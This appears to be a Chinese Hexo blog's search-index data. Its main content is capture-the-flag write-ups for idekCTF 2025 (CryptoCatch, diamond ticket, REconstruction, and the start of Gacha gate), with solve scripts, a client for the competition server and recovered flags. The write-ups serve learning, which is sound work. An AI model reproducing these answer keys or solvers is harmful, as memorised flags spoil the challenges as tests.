print(f&quot;\\n解 &#123;idx + 1&#125;:&quot;)        print(f&quot;x = &#123;sol[x]&#125;&quot;)        print(f&quot;y = &#123;sol[y]&#125;&quot;)        print(f&quot;z = &#123;sol[z]&#125;&quot;)                # 验证解        g_val = g.subs(sol)        i_val = i.subs(sol)        k_val = k.subs(sol)        print(f&quot;验证: g=&#123;g_val&#125;, i=&#123;i_val&#125;, k=&#123;k_val&#125;&quot;)else:    print(&quot;未找到解&quot;)#CCTF&#123;50lv!n6_7H3_H1dD3n__num8Ers_Pr08l3m_f0r_C51dH_4nd_C5uRf_v14_4uT0m473d_C0pp3r5m17h!!?&#125;#本题由Deepseek提供代码\n后记要学的东西好多呢……虽然靠AI能辅助一部分分析和代码工作，不过更多的还是得靠自己&gt;_&lt;\n一年来都在浅水区闲逛，格相关的东西几乎都不了解，虽然也经常参考别的师傅的题解吧，不过大多都看不太懂，于是我就希望写细致一点，来访的朋友能看得容易些。正好也尝试一下Hexo的公式，为了正常显示它们也是费了一番心思hhh\n","categories":["笔记"],"tags":["Writeup","2025","CryptoCTF"]},{"title":"Hello World","url":"/2025/07/09/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n"},{"title":"第一篇文章","url":"/2025/07/09/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","content":"Hello World!我正在测试Hexo的功能，看起来似乎还挺简单的，希望我有时间多写写。\n\n简单做个自我介绍，幻夜子雨，或者Illunight，敬上。\nIllunight来源于illusion + night，即为幻夜，子雨是名字。\n普普通通CTFer，主攻crypto方向，其他领域偶有涉猎，学艺不精。\n超级福瑞控，如果去其他社交媒体搜“幻夜子雨”，会搜到相关内容。\n创立这个博客的理由理由嘛……因为最近暑假期间，比较无聊，于是刷各种crypto题，写题解。但是写了这么多的题解只给自己看也太亏了，于是就呈上来，恳求批评与指导。\n（一共也没写几份，博客倒是创得起劲🙄子雨你适可而止）\n总之就是这样~虽然比较轻率地就放上来了，不过也是对自己的一种督促吧，多做，多见识。\n黑历史……？我已经做好这些文章成为自己黑历史的预期了，如果没有对过去的批判，也就没有进步了hhh\n","categories":["笔记"],"tags":["illunight"]},{"title":"2025 idekCTF题解","url":"/2025/08/05/2025%20idekCTF%E9%A2%98%E8%A7%A3/","content":"前言此前四处搜刮题目做的时候想找Decidophobia的题解，找到了Maple师傅的writeups，于是对idekCTF有了点印象。没过多久，自己也是参与上了，不过也做不出几道题，凑个热闹。\n正文第一天一道题都不会，颇有些破防——然后每睡一觉就解出一道，只恨比赛只有两天。\nCryptoCatch题目如下。\nfrom Crypto.Random.random import randint, choiceimport os# In a realm where curiosity roams free, our fearless cat sets out on an epic journey.# Even the cleverest feline must respect the boundaries of its world—this magical limit holds all wonders within.limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f# Through cryptic patterns, our cat deciphers its next move.def walking(x, y, part):    # Each step is guided by a fragment of the cat&#x27;s own secret mind.    epart = [int.from_bytes(part[i:i+2], &quot;big&quot;) for i in range(0, len(part), 2)]    xx = epart[0] * x + epart[1] * y    yy = epart[2] * x + epart[3] * y    return xx, yy# Enter the Cat: curious wanderer and keeper of hidden paths.class Cat:    def __init__(self):        # The cat&#x27;s starting position is born of pure randomness.        self.x = randint(0, 2**256)        self.y = randint(0, 2**256)        # Deep within, its mind holds a thousand mysterious fragments.        while True:            self.mind = os.urandom(1000)            self.step = [self.mind[i:i+8] for i in range(0, 1000, 8)]            if len(set(self.step)) == len(self.step):                break    # The epic chase begins: the cat ponders and strides toward the horizon.    def moving(self):        for _ in range(30):            # A moment of reflection: choose a thought from the cat&#x27;s endless mind.            part = choice(self.step)            self.step.remove(part)            # With each heartbeat, the cat takes a cryptic step.            xx, yy = walking(self.x, self.y, part)            self.x, self.y = xx, yy            # When the wild spirit reaches the edge, it respects the boundary and pauses.            if self.x &gt; limit or self.y &gt; limit:                self.x %= limit                self.y %= limit                break    # When the cosmos beckons, the cat reveals its secret coordinates.    def position(self):        return (self.x, self.y)# Adventurer, your quest: find and connect with 20 elusive cats.for round in range(20):    try:        print(f&quot;👉 Hunt &#123;round+1&#125;/20 begins!&quot;)        cat = Cat()        # At the start, you and the cat share the same starlit square.        human_pos = cat.position()        print(f&quot;🐱✨ Co-location: &#123;human_pos&#125;&quot;)        print(f&quot;🔮 Cat&#x27;s hidden mind: &#123;cat.mind.hex()&#125;&quot;)        # But the cat, ever playful, dashes into the unknown...        cat.moving()        print(&quot;😸 The chase is on!&quot;)        print(f&quot;🗺️ Cat now at: &#123;cat.position()&#125;&quot;)        # Your turn: recall the cat&#x27;s secret path fragments to catch up.        mind = bytes.fromhex(input(&quot;🤔 Path to recall (hex): &quot;))        # Step by step, follow the trail the cat has laid.        for i in range(0, len(mind), 8):            part = mind[i:i+8]            if part not in cat.mind:                print(&quot;❌ Lost in the labyrinth of thoughts.&quot;)                exit()            human_pos = walking(human_pos[0], human_pos[1], part)        # At last, if destiny aligns...        if human_pos == cat.position():            print(&quot;🎉 Reunion! You have found your feline friend! 🐾&quot;)        else:            print(&quot;😿 The path eludes you... Your heart aches.&quot;)            exit()    except Exception:        print(&quot;🙀 A puzzle too tangled for tonight. Rest well.&quot;)        exit()# Triumph at last: the final cat yields the secret prize.print(f&quot;🏆 Victory! The treasure lies within: &#123;open(&#x27;flag.txt&#x27;).read()&#125;&quot;)\n题目很有诗意hh但是有点像没开thinking的ChatGPT写的，搞了半天是GPT对抗GPT（×）题目生成一只猫，给定它的初始坐标和所有“思考”块，经过一些移动后给出最终坐标，我们需要从最终坐标中得到移动时使用的思考块，重复20次就能抓到猫，获得flag。受到好多阴间题目的“启发”，我第一想到的已经不是如何破解这个问题，而是代码中有没有漏洞。虽然题目的要求很清晰，但是从第71行的if part not in cat.mind:我看出了两点——1.mind没有变过，始终是最初的1000个byte，其中每个8bytes都不重复，因此，虽然猫的移动使用的step不允许重复，但是用户不影响，用户的输入是可以重复的。2.mind是一连串bytes，因此，即使输入的mind分割成part后，某个part不是step的一员，只要它是mind的连续8bytes，就可以通过。所以，我们其实有1000-8+1=993个part可用，而非猫移动时的125个。虽然其实这两点都没用到，但是我觉得抓漏洞也是我们需要做的……说不定哪次就有用呢，AI不太会做这种“违规”的事，只能靠人自己来。题目还给出了一个limit，它是一个1024位的大质数。考虑每一次walking，part是8个byte，分成4个2*8=16bit的数，这样，新的xx和yy长度最多是原来的x和y加16位，30次就是480位。这样的话，猫最终的坐标也只有256+480=736位，还是远小于limit，而猫的moving过程一定会走满30轮。这个如此大的limit有什么用呢？将起点和终点作为向量，则epart中的四个数可以组成一个2*2矩阵$\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix}$。对于1000个随机byte，划分为2byte一组，一共500组。其中出现数字0的期望为$\\frac{500}{2^{16}}$，因此epart矩阵中出现0是不太可能的，出现连续两个0使得xx或yy = 0 * x + 0 * y = 0就更不可能了，在20次挑战中几乎可以排除，因此我们认为每一次walking后，xx大于x，yy大于y。正着找过去，不管选哪个矩阵都满足$\\begin{bmatrix} x_i &amp; y_i \\end{bmatrix}\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix} = \\begin{bmatrix} x_{i+1} &amp; y_{i+1} \\end{bmatrix}$中的$x_{i+1} &gt; x_i,\\; y_{i+1} &gt; y_i$。对于筛选需要的矩阵没有帮助，逆着找过来，$\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix}$的逆矩阵多半含有分数，存储还是计算都不方便，无论哪个方向都不行。……真的吗？我们可以在$\\mathbb{F}_p$中找逆矩阵。对于随机选取的$[0,\\,2^{16}]$中的数，第一行全0概率约为$\\frac{1}{2^{32}}$，第二行与第一行成比例在$\\mathbb{F}_p \\times \\mathbb{F}_p$中共有 $p$ 种可能，而在$[0,2^{16}) \\times [0,2^{16})$的概率为$\\frac{2^{32}}{p^2} * p = \\frac{2^{32}}{p}$，由于这里的$p = \\text{limit}$约有1024bit，两种情况的概率均远小于1，在20次内可认为都不会发生，即所有矩阵都可逆。由于 $p$ 是一个很大的质数，对于小于 $p$ 的任何正整数 $a$ ，都有$\\text{gcd}(a,p) = 1$，因此一定有逆元 $a^{-1}$ 存在。且因为这里矩阵的每个数都是1~65535（0不考虑），所以除了1以外，其他数的逆元可以表示为$\\frac{kp+1}{a}$，它大于1024-16=1008位，1的逆元当然是1。在同样不考虑1出现在epart中后，原始矩阵的逆矩阵中每个数都很大。这样，因为我们知道 $x_{30}&gt;x_{29}，y_{30}&gt;y_{29}$ ，我们只需找出合适的矩阵，模乘逆矩阵后得到的$(x_{29},y_{29})$满足上式即可。由于最初cat选择的第30个矩阵一定满足，所以至少有一个解。最后我们分析出现多个解的概率。由上可知，逆矩阵中每个元素都很大，因此它们之间间隔也很大，可以看作是随机选择的矩阵。由于最终结果约736位，故期望的倒数第二步结果小于736位。给定最终的 $(x_{30},y_{30})$，$(x_{29},y_{29})$ 满足条件的概率为$(\\frac{2^{736}}{2^{1024}})^2$，因此，除了内定的一个解，在125个矩阵中出现其他解的概率同样极小。这样，只要遍历125个矩阵的逆矩阵，每次都寻找一个，使得倒推的向量中，每一个分量都小于前一步向量的分量，找到30次回到原点，就得到了part的逆序，倒序发送即可。\nfrom ast import literal_evalfrom typing import List, Tuplefrom Crypto.Util.number import getPrimedef find_candidate_prev_points(        mind: bytes,        endpoint: Tuple[int, int],        limit: int) -&gt; List[Tuple[int, int, int]]:    &quot;&quot;&quot;    For each 8-byte part in &#x27;mind&#x27;, treat it as a 2x2 matrix over F_p (p=limit),    compute its inverse, apply it to &#x27;endpoint&#x27;, and collect those previous points    whose coordinates are both strictly less than the corresponding coordinates of endpoint.    Returns a list of tuples: (index, prev_x, prev_y).    &quot;&quot;&quot;    x_n, y_n = endpoint    candidates = []    for i in range(125):        part = mind[i * 8:(i + 1) * 8]        e0 = int.from_bytes(part[0:2], &quot;big&quot;) % limit        e1 = int.from_bytes(part[2:4], &quot;big&quot;) % limit        e2 = int.from_bytes(part[4:6], &quot;big&quot;) % limit        e3 = int.from_bytes(part[6:8], &quot;big&quot;) % limit        det = (e0 * e3 - e1 * e2) % limit        if det == 0:            continue        det_inv = pow(det, -1, limit)        inv_a = (e3 * det_inv) % limit        inv_b = (-e1 * det_inv) % limit        inv_c = (-e2 * det_inv) % limit        inv_d = (e0 * det_inv) % limit        prev_x = (inv_a * x_n + inv_b * y_n) % limit        prev_y = (inv_c * x_n + inv_d * y_n) % limit        if prev_x &lt; x_n and prev_y &lt; y_n:            candidates.append((i, prev_x, prev_y))    return candidatesdef recover_mind_sequence(        mind: bytes,        start: Tuple[int, int],        end: Tuple[int, int],        limit: int,        steps: int = 30) -&gt; List[bytes]:    &quot;&quot;&quot;    Reverse-engineer the sequence of &#x27;parts&#x27; used by the cat to move from &#x27;start&#x27; to &#x27;end&#x27;.    Returns the list of 8-byte parts in forward order.    &quot;&quot;&quot;    current = end    seq_indices = []    seq_coords = []    for step in range(steps):        candidates = find_candidate_prev_points(mind, current, limit)        if len(candidates) != 1:            raise ValueError(f&quot;Step &#123;step + 1&#125;: expected 1 candidate, found &#123;len(candidates)&#125;&quot;)        idx, prev_x, prev_y = candidates[0]        seq_indices.append(idx)        seq_coords.append((prev_x, prev_y))        current = (prev_x, prev_y)    # Verify we reached the start coordinate    if current != start:        raise ValueError(f&quot;After reverse (&#123;steps&#125; steps), reached &#123;current&#125;, expected start &#123;start&#125;&quot;)    # Reverse indices to forward order and extract parts    seq_indices.reverse()    recovered_parts = [mind[i * 8:(i + 1) * 8] for i in seq_indices]    return recovered_partsdef simulate_walking_sequence(        start: Tuple[int, int],        parts: List[bytes]) -&gt; Tuple[int, int]:    &quot;&quot;&quot;    Simulate the cat&#x27;s walking forward using the recovered parts to verify correctness.    &quot;&quot;&quot;    x, y = start    for part in parts:        # parse matrix        e0 = int.from_bytes(part[0:2], &quot;big&quot;)        e1 = int.from_bytes(part[2:4], &quot;big&quot;)        e2 = int.from_bytes(part[4:6], &quot;big&quot;)        e3 = int.from_bytes(part[6:8], &quot;big&quot;)        xx = e0 * x + e1 * y        yy = e2 * x + e3 * y        x, y = xx, yy    return (x, y)if __name__ == &quot;__main__&quot;:    import os    from pwn import *    conn = remote(&#x27;catch.chal.idek.team&#x27;, 1337)    for iter in range(20):        conn.recvuntil(b&#x27;Co-location: &#x27;)        x0, y0 = literal_eval(conn.recvline().decode())        #print(x0, y0)        conn.recvuntil(b&#x27;Cat\\&#x27;s hidden mind: &#x27;)        mind_hex = conn.recvline().decode()        mind = bytes.fromhex(mind_hex)        conn.recvuntil(b&#x27;Cat now at: &#x27;)        xn, yn = literal_eval(conn.recvline().decode())        limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f        conn.recvuntil(b&#x27;Path to recall (hex):&#x27;)        parts = recover_mind_sequence(mind, (x0, y0), (xn, yn), limit)        print(&quot;Recovered sequence of indices and parts:&quot;)        sendpart = &#x27;&#x27;.join(part.hex() for part in parts)        print(sendpart)        # Verify forward simulation        simulated_end = simulate_walking_sequence((x0, y0), parts)        #print(&quot;Simulated end:&quot;, simulated_end)        #print(&quot;Original end: &quot;, (xn, yn))        if simulated_end == (xn, yn):            print(&quot;Verification passed!&quot;)        else:            print(&quot;Verification failed.&quot;)        conn.sendline(sendpart.encode())    conn.interactive()#idek&#123;Catch_and_cat_sound_really_similar_haha&#125;#By the way, 这个limit换成其他的大质数也可以过关，只要比x_30和y_30大就可以了。\ndiamond ticket题目如下。\nfrom Crypto.Util.number import *#Some magic from Willy Wonkap = 170829625398370252501980763763988409583a = 164164878498114882034745803752027154293b = 125172356708896457197207880391835698381def chocolate_generator(m:int) -&gt; int:    return (pow(a, m, p) + pow(b, m, p)) % p#The diamond ticket is hiding inside chocolatediamond_ticket = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()assert len(diamond_ticket) == 26assert diamond_ticket[:5] == b&quot;idek&#123;&quot;assert diamond_ticket[-1:] == b&quot;&#125;&quot;diamond_ticket = bytes_to_long(diamond_ticket[5:-1])flag_chocolate = chocolate_generator(diamond_ticket)chocolate_bag = []#Willy Wonka are making chocolatesfor i in range(1337):    chocolate_bag.append(getRandomRange(1, p))#And he put the golden ticket at the endchocolate_bag.append(flag_chocolate)#Augustus ate lots of chocolates, but he can&#x27;t eat all cuz he is full now :Dremain = chocolate_bag[-5:]#Compress all remain chocolates into oneremain_bytes = b&quot;&quot;.join([c.to_bytes(p.bit_length()//8, &quot;big&quot;) for c in remain])#The last chocolate is too important, so Willy Wonka did magic againP = getPrime(512)Q = getPrime(512)N = P * Qe = bytes_to_long(b&quot;idek&#123;this_is_a_fake_flag_lolol&#125;&quot;)d = pow(e, -1, (P - 1) * (Q - 1))c1 = pow(bytes_to_long(remain_bytes), e, N)c2 = pow(bytes_to_long(remain_bytes), 2, N) # A small gift#How can you get it ?print(f&quot;&#123;N = &#125;&quot;)print(f&quot;&#123;c1 = &#125;&quot;)print(f&quot;&#123;c2 = &#125;&quot;) &quot;&quot;&quot;N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649&quot;&quot;&quot;\n一道充满着“特别”的题目，每一个数据都是精心给出的。拿到题目，先读一下巧克力工厂的故事，flag开头和结尾共6 bytes已给出，中间20 bytes未知。列表chocolate_bag加入了1337个1~p的随机数，又加入了 $(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p$ 的值——看起来又是一个离散对数，而且不是普通的离散对数。生成结束后，remain仅包含最后5个数，所幸包含flag信息的项是最后一项，它保留了下来。将这5项转化为16*5=80 bytes的字节串并拼接，最后是一个RSA加密。因此，如果没有意外，我们的大致逻辑应该是 解密RSA -&gt; 提取flag_chocolate -&gt; 还原diamond_ticket 。这样做也确实能够得到答案。\n第1步：解密RSA已知$m^e\\ \\text{mod}\\ N$和$m^2\\ \\text{mod}\\ N$，且 $m$ 是一个80*8=640bit的数， $m^2$ 也有1280位，爆破高256位不现实。由于e是一个247位的奇数，$\\text{gcd}(e,2) = 1$，我们用 $m^2$ 和 $m^e$ 凑出 $m^1$ 。可以构造 $m^1 = m^{1\\ast e-\\frac{e-1}{2}\\ast 2} = m^e \\ast  (m^2)^{-\\frac{e-1}{2}}$ ，模 $N$ 下运算得到 $m$ 。\n第2步：提取flag_chocolate我们只要最后一项，故提取最后16个byte，咱图省事就全部一起提取了，并输出chunks的最后一个元素。\n第3步：还原diamond_ticket此时我们拥有等式$(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p = c$ ，已知a, b, c, p，求flag。在咨询了Deepseek等AI并通过代码验证后，我们发现了给定的a, b, p有一些有趣的性质——$p$ 是一个质数，但 $p-1 = 2 × 40841 × 50119 × 51193 × 55823 × 57809 × 61991 × 63097 × 64577$ ，是很多小素数之积（ $p-1$ 是光滑数）。$a$ 和 $b$ 的阶均为 $\\frac{p-1}{2}$ ，且 $b = a^{73331}\\ \\text{mod}\\ p$因此，对于问题$(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p = c$，将其转化为$((a^\\text{flag}+(a^\\text{flag})^{73331}) - c )\\ \\text{mod}\\ p = 0$，即寻找$f(x) = x^{73331}+x-c$ 的一个根$x_0$。一旦找到这个根，它就是 $a^\\text{flag}$ ，转化为普通的离散对数，再利用Pohlig-Hellman算法，求得阶为光滑数的离散对数。使用cypari库对该函数进行求根，相比sage的roots()函数，它快得多，只需要十多秒就能得到答案。再利用sage自带的discrete_log()函数求解即可得到flag。\n……真的吗？将求出的 x = 4807895356063327854843653048517090061 转换成bytes后不都是可打印字符，说明我们还有路没走完，但是 assert chocolate_generator(x) == c 也通过了，说明我们确实找到了正确的一个x。求一下x的位数，它有122位，而diamond_ticket有20*8=160位。由于 $a$, $b$ 的阶相等，故$a^\\frac{p-1}{2}\\ \\text{mod}\\ p = b^\\frac{p-1}{2}\\ \\text{mod}\\ p = 1$，因此除了 $x$ 以外，所有 $x+k\\ast \\frac{p-1}{2}$ 也都是可能的diamond_ticket，$k$ 为正整数。对于该取什么 $k$ 没有好的办法，一共20 bytes（160位），最高位的byte最多是0x7E(01111110)，故diamond_ticket最多有159位；最少是0x20(00100000)，diamond_ticket最少也有158位。根据 $\\text{diamond_ticket} = x+k\\ast \\frac{p-1}{2}$ 可知 $k$ 至少为31位，最多为32位，我们遍历k in range(2**31, 2**33)即可。由于数据过大，采用多线程并行加速，实测本机32线程约20分钟。以及，我的多线程写得一团糟，把起点修改为 $2^{31}$ 就给不出结果，所以代码是从 $0$ 遍历到 $2^{33}$ ，多花了约$\\frac{1}{4}$的时间。\n######################################################pythonfrom Crypto.Util.number import *N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649e = 186211850710224327090212578283834164039515361235211653610924153794366237821# 已知量：N, e, c1, c2# 计算 temp = (e-1)//2temp = (e - 1) // 2# 先算 t = c2^temp mod Nt = pow(c2, temp, N)# 再算 t 的模反元素 inv_t = t^&#123;-1&#125; mod Ninv_t = inverse(t, N)# 最后 m = c1 * inv_t mod Nm = (c1 * inv_t) % Nassert pow(m,e,N) == c1assert pow(m,2,N) == c2# 将整数 m 转成字节串remain_bytes = long_to_bytes(m)print(remain_bytes)#b&#x27;&#123;\\xd1\\xdf\\xeb|F\\xce\\xbc\\x11\\xd8nZ\\x8b\\xfc\\xaebN\\xf4\\x8a&#123;0,\\x01\\xb7\\xf9\\xe7\\xb5q\\xc93%\\xba\\x0b\\x15\\x94g\\x0b|\\xd8 \\xf38\\xf2\\xe2#\\t\\x0ci^\\x10\\x86\\x94\\x12\\xcb\\xe7b/\\xefj\\xb5\\x05\\xfb\\xc8\\xf9J\\xebU|z\\x10\\xd3|\\xa7\\xec\\xd1\\x9d\\x17\\\\P\\xb3&#x27;#其中\\\\表示一个反斜杠，算一个byte#Some magic from Willy Wonkap = 170829625398370252501980763763988409583a = 164164878498114882034745803752027154293b = 125172356708896457197207880391835698381L = p.bit_length() // 8   # =128//8 =16chunks = [remain_bytes[i*L:(i+1)*L] for i in range(5)]print(bytes_to_long(chunks[-1]))#99584795316725433978492646071734128819######################################################sagedef chocolate_generator(m:int) -&gt; int:    return (pow(a, m, p) + pow(b, m, p)) % pc = 99584795316725433978492646071734128819import cypari2pari = cypari2.Pari()def roots_mod_p_via_pari(k, c, p):    y = pari(&#x27;y&#x27;)    f = y**k + y - c    return list(map(int, pari(f).polrootsmod(p)))k = 73331roots = roots_mod_p_via_pari(k, c, p)print(&quot;roots:&quot;, roots)#[126961729658296101306560858021273501485]a = 164164878498114882034745803752027154293for y in roots:    # 把 a, y 视为 GF(p) 中的元素    F = GF(p)    A = F(a)    Y = F(y)    # 调用 discrete_log    x = discrete_log(Y, A)    assert chocolate_generator(x) == c    print(&quot;解得 x =&quot;, x)#4807895356063327854843653048517090061######################################################pythondef is_all_printable(bs: bytes) -&gt; bool:    return all(0x20 &lt;= b &lt;= 0x7E for b in bs)import multiprocessing# 上一部分结果BASE = 4807895356063327854843653048517090061from tqdm import tqdmimport os# 子任务：在给定区间内查找满足条件的 jdef worker(start: int, end: int, queue):    results = []    for j in range(start, end):        val = BASE + (p-1)//2 * j        text = long_to_bytes(val)        if is_all_printable(text):            results.append((j, text))        if j % 10000 == 0:            queue.put(10000)    return resultsif __name__ == &#x27;__main__&#x27;:    multiprocessing.set_start_method(&#x27;spawn&#x27;)  # For compatibility, especially on Windows    cpu_count = multiprocessing.cpu_count()    total = 2**33    chunk = total // cpu_count    # 使用 Manager 和 Queue 跟踪进度    with multiprocessing.Manager() as manager:        queue = manager.Queue()        pool = multiprocessing.Pool(processes=cpu_count)        # 用 tqdm 显示总进度        with tqdm(total=total, desc=&quot;Brute-forcing&quot;, unit=&quot;j&quot;) as pbar:            results = []            tasks = []            for i in range(cpu_count):                start = i * chunk                end = start + chunk if i &lt; cpu_count - 1 else total                tasks.append(pool.apply_async(worker, (start, end, queue)))            # 实时更新进度条            finished = 0            while finished &lt; total:                inc = queue.get()                pbar.update(inc)                finished += inc            # 等待所有任务完成并收集结果            pool.close()            pool.join()            for task in tasks:                for j, text in task.get():                    print(f&quot;Found j=&#123;j&#125;: &#123;text&#125;&quot;)                    #Found j=7781310273: b&#x27;tks_f0r_ur_t1ck3t_xD&#x27;#idek&#123;tks_f0r_ur_t1ck3t_xD&#125;\nREconstruction附件是一个elf程序，试验得知，当没有参数时，输出👀，有参数时，输出Wrong! ，搜索字符串发现：\n.rodata:0000000000403013 aCorrect        db &#x27;Correct!&#x27;,0         ; DATA XREF: sub_401050:loc_401159↑o.rodata:000000000040301C aWrong          db &#x27;Wrong!&#x27;,0           ; DATA XREF: sub_401050+CE↑o\n推测主函数是sub_401050，找到该函数：\nunsigned __int64 __fastcall sub_401050(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)&#123;  __int64 v6; // rcx  unsigned __int64 i; // rax  int v8; // edx  __int64 v9; // rdx  int v10; // eax  unsigned int v11; // ebp  signed __int64 v12; // r12  unsigned __int8 *v13; // rax  unsigned __int64 result; // rax  char v15[24]; // [rsp+0h] [rbp-1038h] BYREF  unsigned __int64 v16; // [rsp+1008h] [rbp-30h]  LODWORD(v6) = 0;  v16 = __readfsqword(0x28u);  for ( i = 0; i != 42; ++i )  &#123;    v8 = v6 ^ (unsigned __int8)::a3[i];    v6 += 31;    v9 = (i &gt;&gt; 1) ^ v8 ^ 0x5A;    byte_405140[i] = v9;  &#125;  byte_40516A = 0;  v10 = sub_401670((__int64)&quot;/proc/self/cmdline&quot;, 0, v9, v6, a5, a6, v15[0]);  v11 = v10;  if ( v10 &gt;= 0 )  &#123;    v12 = sub_401A10((unsigned int)v10, v15, 4095);    sub_4019C0(v11);    if ( v12 &gt; 0 )    &#123;      v15[v12] = 0;      v13 = sub_401830(v15, 0, v12);      if ( v13 )      &#123;        if ( v13 + 1 &lt; (unsigned __int8 *)&amp;v15[v12] )        &#123;          if ( (unsigned int)sub_401910(v13 + 1, byte_405140) )            sub_401770(&quot;Wrong!&quot;);          else            sub_401770(&quot;Correct!&quot;);          sub_401010(0);        &#125;      &#125;    &#125;  &#125;  result = v16 - __readfsqword(0x28u);  if ( result )    sub_401610();  return result;&#125;\n因此，正确答案的生成过程是\nLODWORD(v6) = 0;for ( i = 0; i != 42; ++i )&#123;  v8 = v6 ^ (unsigned __int8)::a3[i];  v6 += 31;  v9 = (i &gt;&gt; 1) ^ v8 ^ 0x5A;  byte_405140[i] = v9;&#125;\n分析它太麻烦了，直接动态调试到这个位置，提取byte_405140如下。\n.bss:0000000000405140 ; _BYTE byte_405140[42].bss:0000000000405140 byte_405140 db 69h, 64h, 65h, 6Bh, 7Bh, 68h, 65h, 34h, 72h, 64h, 5Fh, 30h, 66h, 5Fh.bss:0000000000405140                                         ; DATA XREF: sub_401050+1C↑o.bss:000000000040514E db 63h, 6Fh, 6Eh, 73h, 74h, 72h, 75h, 63h, 74h, 6Fh, 72h, 73h, 3Fh, 5Fh.bss:000000000040515C db 6Eh, 6Fh, 77h, 5Fh, 79h, 6Fh, 75h, 5Fh, 64h, 31h, 64h, 21h, 21h, 7Dh.bss:000000000040516A byte_40516A db 0                        ; DATA XREF: sub_401050+6C↑w\n续上后面的byte_40516A = 0;，直接可以在IDA中整合成字符串：\n.bss:0000000000405140 aIdekHe4rd0fCon db &#x27;idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;&#x27;,0.bss:0000000000405140                                         ; DATA XREF: sub_401050+1C↑o\n于是我们已经找到了——idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;\n但是这太快了，于是水一下wp（×）\n对输入的判定过程是\nif ( (unsigned int)sub_401910(v13 + 1, byte_405140) )  sub_401770(&quot;Wrong!&quot;);else  sub_401770(&quot;Correct!&quot;);\n中间就是截取输入的过程\nv10 = sub_401670((__int64)&quot;/proc/self/cmdline&quot;, 0, v9, v6, a5, a6, v15[0]);v11 = v10;if ( v10 &gt;= 0 )&#123;  v12 = sub_401A10((unsigned int)v10, v15, 4095);  sub_4019C0(v11);  if ( v12 &gt; 0 )  &#123;    v15[v12] = 0;    v13 = sub_401830(v15, 0, v12);    ...\n判定输入的函数 sub_401910 是\n__int64 __fastcall sub_401910(unsigned __int8 *a1, unsigned __int8 *a2)&#123;  unsigned __int8 v2; // dl  int v3; // ecx  __int64 v4; // rax  v2 = *a1;  v3 = *a2;  v4 = 1;  if ( *a1 != (_BYTE)v3 )    return (unsigned int)v2 - v3;  while ( v2 )  &#123;    v2 = a1[v4++];    v3 = a2[v4 - 1];    if ( v2 != (_BYTE)v3 )      return (unsigned int)v2 - v3;  &#125;  return (unsigned int)-v3;&#125;\n其要求 *a1 和 *a2 每一位都要相等，如果有不等的位，则返回他们的差值；如果v3更长，则返回v2结束后的第一个v3的位。由于我们已知作为字符串末尾的byte_40516A是0，因此唯一能让这个判定返回0的方法是，输入的长度与v13相等，且每一位都一样，这样返回的就是字符串末尾的0。\n因此，根据前面的提取数据过程，最后应该输入idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;，这就是flag。\nMiscGacha gate题目如下。\n#!/usr/bin/env python3import contextlibimport osimport randomimport reimport signalimport sysfrom z3 import ArithRef, BitVec, BitVecRef, BitVecVal, Solver, simplify, unsatWIDTH = 32OPS = [&#x27;~&#x27;, &#x27;&amp;&#x27;, &#x27;^&#x27;, &#x27;|&#x27;]MAX_DEPTH = 10FLAG = os.getenv(&#x27;FLAG&#x27;, &#x27;idek&#123;fake_flag&#125;&#x27;)VARS = set(&#x27;iIl&#x27;)def rnd_const() -&gt; tuple[str, BitVecRef]:    v = random.getrandbits(WIDTH)    return str(v), BitVecVal(v, WIDTH)def rnd_var() -&gt; tuple[str, BitVecRef]:    name = 